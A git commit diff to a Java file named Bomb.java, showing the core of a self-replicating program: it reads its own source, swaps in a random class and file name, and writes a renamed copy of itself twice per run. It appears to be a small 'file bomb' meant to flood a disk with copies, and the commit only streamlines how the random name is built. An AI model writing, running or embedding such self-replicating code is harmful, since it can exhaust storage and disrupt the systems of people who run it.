b7b7b0b6fef58d49fc4eb590f5f7f59742cf690e
ayylamo <ayylamo@cock.li>
2017-03-03 23:27:05 -0600

    further streamlined code

--- Bomb.java
+++ Bomb.java
@@ -5,8 +5,7 @@ class Bomb {
 	public static void main(String[] args) throws Exception{
 		for (int i = 0; i<2; ++i){
 			String[] self = new Scanner(new File("Bomb.java")).useDelimiter("\\Z").next().split("\n");
-			int random = (int)(Math.random()*123456789);
-			String name = "a"+random;
+			String name = "a"+(int)(Math.random()*123456789);
 			self[3] = self[3].replace(self[3].substring(6,self[3].indexOf(" {")),name);
 			self[6] = self[6].replace(self[6].substring(self[6].indexOf("File")+6,self[6].indexOf(".java")),name);
 			new FileOutputStream(name+".java").write(String.join("\n",self).getBytes());
